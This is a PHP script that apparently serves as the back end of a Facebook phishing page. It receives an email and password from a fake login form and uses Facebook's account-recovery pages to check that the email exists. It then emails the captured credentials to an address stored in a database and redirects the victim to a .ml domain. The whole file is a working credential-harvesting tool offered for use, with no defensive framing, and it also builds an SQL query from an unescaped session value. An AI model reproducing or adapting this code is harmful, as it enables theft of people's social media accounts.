<?php
if(!empty($_POST["email"])&&!empty($_POST["pass"])){
	session_start();
	$head = [
	"Host:mbasic.facebook.com",
	"cache-control:max-age=0",
	"sec-ch-ua-mobile:?1",
	"origin:https://mbasic.facebook.com",
	"upgrade-insecure-requests:1",
	"dnt:1",
	"content-type:application/x-www-form-urlencoded",
	"save-data:on",
	"user-agent:Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
	"accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"sec-fetch-site:same-origin",
	"sec-fetch-mode:navigate",
	"sec-fetch-user:?1",
	"referer:https://mbasic.facebook.com/",
	];
$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&alternate_search=0&toggle_search_mode=1&ref=dbl",
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_SSL_VERIFYHOST => false,
CURLOPT_HEADER => true,
CURLOPT_HTTPHEADER => $head));
$mr2 = curl_exec($mr);
$lsd = explode('"',explode('lsd" value="',$mr2)[1])[0];
$jaz = explode('"',explode('jazoest" value="',$mr2)[1])[0];
$data = "lsd=$lsd&jazoest=$jaz&email=".$_POST["email"]."&did_submit=T%C3%ACm+ki%E1%BA%BFm";
curl_setopt_array($mr, array(
CURLOPT_URL => "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0&ref=dbl",
CURLOPT_POSTFIELDS => $data,
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $mr2, $matches),
CURLOPT_COOKIE => implode(";",$matches[1]),
CURLOPT_HEADER => true,));
$mr2 = curl_exec($mr);curl_close($mr);
	if(stripos($mr2,"Location")==true){
	include("connect.php");
	$id = $_SESSION["id"];
	$sql = "SELECT * FROM `infor` WHERE id='$id'";
	$dulieu = mysqli_query($connect,$sql);
	$row = mysqli_fetch_assoc($dulieu);
	$mail = $row["email"];
	$_SESSION["user"]=$_POST["email"];
	mail("$mail","Tài Khoản Facebook",$_POST["email"]."|".$_POST["pass"],"From CongDauMoi");
	echo("<script>window.location.href='http://javasian69.ml/';</script>");
	mysqli_close($connect);
	die;
}else{
	echo("<script> alert('Số di động, email hoặc mật khẩu của bạn nhập không khớp với tài khoản nào, vui lòng thử lại.');window.location.href='http://javasian69.ml/login.html'</script>");
	die();
}
}else{
	echo("<script> alert('Số di động, email hoặc mật khẩu của bạn nhập không khớp với tài khoản nào, vui lòng thử lại.');window.location.href='http://javasian69.ml/login.html'</script>");
	die();	
}
?>